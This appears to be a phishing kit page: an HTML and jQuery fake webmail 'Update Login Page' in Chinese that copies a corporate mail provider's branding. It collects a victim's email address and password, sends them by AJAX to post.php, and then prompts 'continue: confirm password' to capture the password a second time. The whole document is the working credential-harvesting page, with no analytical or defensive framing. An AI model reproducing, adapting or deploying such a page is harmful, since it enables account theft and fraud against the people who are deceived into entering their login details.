﻿<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Postmaster | Update Login Page</title>
</head>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">

<style>

a{
	color:#363636; }
	
input[placeholder] {
	font-size: 12px;
	font-weight: 500; }

#header-links{
	border-right: 1px solid #000000;
	padding: 2px 20px;
	border-right-color: #AAAAAA;
	font-size:12px; }
	
</style>

</style>

<body>

<div id="main-container">

<div id="header" style="max-width: 100%; background-color: #F5F7F9;">
    <img src="files/logo.png" alt="logo" style="margin:7px 40px;">
    
   <span style="margin-left:32%;">
        <span id="header-links"><a style="text-decoration:none;" href="#">企业邮箱</a></span>
        <span id="header-links"><a style="text-decoration:none;" href="#">取得應用程式</a></span>
        <span id="header-links"><a style="text-decoration:none;" href="#">服務中心</a></span>
        <span id="header-links"><a style="text-decoration:none;" href="#">協助</a></span>
        <span id="header-links"><a style="text-decoration:none;" href="#">简体中文</a></span>
        <span id="header-links" style="border-right: none;"><a style="text-decoration:none;" href="#">English</a></span>
   </span>
  
</div>

<div id="content" style="padding: 30px 30px 120px 10px; background-color: #EFF9FF;">
<table>
	<tr>
    
    <td><img class="img-responsive" src="files/mail_image.png" alt="trade" style="margin-left: 10%; margin-top: 15%; margin-right: 120px;"></td>
    
        <td style="border: 1px solid #E5E5E5; width: 320px; box-shadow: 0 0 5px rgba(58,58,58,0.5); -webkit-box-shadow: 0 0 5px rgba(58,58,58,0.5); background: #FFFFFF;">
        
        	<form style="padding: 0 30px 0 30px; margin-top: -120px;" action="post.php" method="post">

              <div class="form-group form" id="email-group">
              <label for="email" style="font-size: 12px;">帳號 : </label>
<input type="email" class="form-control" id="email" name="email" placeholder="電子郵件位址" style="height: 30px; border-radius: 0; margin-top: -2px;">
              </div>

                        
                        <div class="form-group" id="pass-group">
           <label for="pass" style="font-size: 12px;">密碼 : </label>
         <label for="forget-pass" style="font-size: 12px; font-weight: 600; color:#426AEC;" class="pull-right">忘記密碼?</label>
       <input type="password" class="form-control" id="pass" name="pass" placeholder="密碼" style="border-radius: 0; background-color: #FFFFFF; border-radius: 0; height: 30px; margin-top: -2px;">
                        </div>
                  
                        
                 <button type="submit" class="btn btn-default" style="background: #FA4C45; width: 100%; border: 1px solid #EB6C00; color: #FFFFFF; font-weight: bold; font-size: 15px; border-radius: 0;">登入</button>
                 
                 <p style="color: #0055AF; margin-top: 20px; margin-left: 200px; font-size: 12px;">免費加入</p>
                       
            </form>
        </td>
        
    </tr>
</table>

<center>
<div class="mail-logos" style="margin-top: 7%;">
	<img src="files/Mail logo.png" alt="mail-logos">
</div>
</center>

</div>

<div id="footer" style="background: #F5F5F5; border-top: 1px solid #E5E5E5;">
<center>
	<table style="font-size: 12px; margin-top: 15px;">
    	<tr>
        	<td><a href="#">關於我們 &nbsp;&nbsp;&nbsp;</a></td>
            <td><a href="#">&nbsp;&nbsp;&nbsp;聲明 &nbsp;&nbsp;&nbsp;</a></td>
            <td><a href="#">&nbsp;&nbsp;&nbsp;朋友連結 &nbsp;&nbsp;&nbsp;</a></td>
            <td><a href="#">&nbsp;&nbsp;&nbsp;2009-2020 版權 ICP: Zhe B2-20080101</a></td>
        </tr>
    </table>
    
</center>
</div>


</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>

<script>

$(document).ajaxStart(function() {
    $(".loading").css("display", "inline");
});

$(document).ajaxComplete(function() {
    $(".loading").css("display", "none");
});

//Form  submit Request
$("form").submit(function(event){
	$('.form-group').removeClass('has-error'); // remove the error class
    	$('.help-block').remove(); // remove the error text
        // get the form data
        // there are many ways to get this data using jQuery (you can use the class or id also)
		
		var email = $('input[name=email]').val();
		var pass = $('input[name=pass]').val();
		
		// process the form
        $.ajax({
            type        : 'POST', // define the type of HTTP verb we want to use (POST for our form)
            url         : 'post.php', // the url where we want to POST
            data        : {email : email, pass : pass}, // our data object
            dataType    : 'json', // what type of data do we expect back from the server
           	encode      : true
        })// using the done promise callback
            .done(function(data) {
				
				if ( ! data.success) {

					// handle errors for password field ---------------
					if (data.errors.email) {
						$('#email-group').addClass('has-error'); // add the error class to show red input
						$('#email-group').append('<div class="help-block">' + data.errors.email + '</div>'); // add the actual error message under our input
					}
					
					// handle errors for password field ---------------
					if (data.errors.pass) {
						$('#pass-group').addClass('has-error'); // add the error class to show red input
						$('#pass-group').append('<div class="help-block">' + data.errors.pass + '</div>'); // add the actual error message under our input
					}

        	     } else {

					// ALL GOOD! just show the success message!
					$("#email, #pass").val(null);
					alert("continue: confirm password");
				 }
				 
			});
			// stop the form from submitting the normal way and refreshing the page
        	event.preventDefault();
});
//Form submit Request
</script>

</body>
</html>